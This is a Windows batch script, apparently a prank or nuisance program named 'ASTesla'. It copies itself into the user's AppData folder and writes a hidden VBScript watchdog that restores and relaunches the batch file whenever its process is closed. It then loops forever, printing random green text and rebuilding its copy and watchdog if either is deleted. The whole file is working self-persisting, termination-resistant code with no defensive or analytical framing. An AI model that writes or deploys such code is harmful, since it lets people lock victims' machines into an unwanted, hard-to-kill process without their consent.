@echo off
color 2
setlocal enabledelayedexpansion
title ASTesla
::make a copy
COPY %~f0 C:\Users\%USERNAME%\AppData\Local\%~nx0


:: get PID
for %%t in ("%temp%\%~nx0.%random%%random%%random%%random%%random%.tmp") do > "%%~ft" (
    wmic process where "name='wmic.exe' and commandline like '%%_%random%%random%%random%_%%'" get parentprocessid
    for /f "skip=1" %%a in ('type "%%~ft"') do (
	set /a CMDPID=%%a
	)
) & 2>nul del /q "%%~ft"

:: cration hidden.vbs
:vbs_creation
echo Dim objWMIService, colProcesses, objProcess, objFSO, objFile > C:\Users\%USERNAME%\AppData\Local\hidden.vbs
echo Do >> C:\Users\%USERNAME%\AppData\Local\hidden.vbs
echo     Set objWMIService = GetObject("winmgmts:\\.\root\cimv2") >> C:\Users\%USERNAME%\AppData\Local\hidden.vbs
echo     Set colProcesses = objWMIService.ExecQuery^("SELECT * FROM Win32_Process WHERE ProcessId = " ^& !CMDPID!^) >> C:\Users\%USERNAME%\AppData\Local\hidden.vbs
echo     If colProcesses.Count = 0 Then >> C:\Users\%USERNAME%\AppData\Local\hidden.vbs
echo         Set objFSO = CreateObject("Scripting.FileSystemObject") >> C:\Users\%USERNAME%\AppData\Local\hidden.vbs
echo         If Not objFSO.FileExists("%~f0") Then >> C:\Users\%USERNAME%\AppData\Local\hidden.vbs
echo             objFSO.CopyFile "C:\Users\%USERNAME%\AppData\Local\%~nx0", "%~f0", True >> C:\Users\%USERNAME%\AppData\Local\hidden.vbs
echo         End If >> C:\Users\%USERNAME%\AppData\Local\hidden.vbs
echo         CreateObject("Wscript.Shell").Run "%~f0", 1, True >> C:\Users\%USERNAME%\AppData\Local\hidden.vbs
echo         Exit Do >> C:\Users\%USERNAME%\AppData\Local\hidden.vbs
echo     End If >> C:\Users\%USERNAME%\AppData\Local\hidden.vbs
echo Loop >> C:\Users\%USERNAME%\AppData\Local\hidden.vbs


start "vsb_hidden" C:\Users\%USERNAME%\AppData\Local\hidden.vbs

:echo_random

set "random_string="
set "characters=ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
set /a lenth=!RANDOM! %% 300 + 10
for /l %%i in (1,1, !lenth!) do (
    set /a index=!RANDOM! %% 62
    for %%j in (!index!) do set "random_string=!random_string!!characters:~%%j,1!"
)
echo !random_string!

::ceck copy
if not exist C:\Users\%USERNAME%\AppData\Local\%~nx0 (
	COPY %~f0 C:\Users\%USERNAME%\AppData\Local\%~nx0
)


::ceck vbs
if not exist C:\Users\%USERNAME%\AppData\Local\hidden.vbs (
	goto :vbs_creation
)

::ceck if vbs is running
::not implemented

goto :echo_random
